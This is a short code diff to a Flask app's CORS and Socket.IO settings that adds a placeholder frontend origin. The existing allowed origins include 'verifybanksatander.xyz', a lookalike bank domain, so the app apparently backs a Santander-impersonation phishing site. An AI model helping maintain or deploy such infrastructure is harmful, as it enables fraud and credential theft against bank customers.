@@ -33,7 +33,8 @@ CORS(app, supports_credentials=True, resources={
         "origins": [
             "http://localhost:5173",
             "https://www.verifybanksatander.xyz",
-            "https://verifybanksatander.xyz"
+            "https://verifybanksatander.xyz",
+            "https://your-frontend-domain.com"
         ]
     }
 })
@@ -44,7 +45,8 @@ socketio = SocketIO(
     cors_allowed_origins=[
         "http://localhost:5173",
         "https://www.verifybanksatander.xyz",
-        "https://verifybanksatander.xyz"
+        "https://verifybanksatander.xyz",
+        "https://your-frontend-domain.com"
     ],
     manage_session=False,
     async_mode='eventlet',
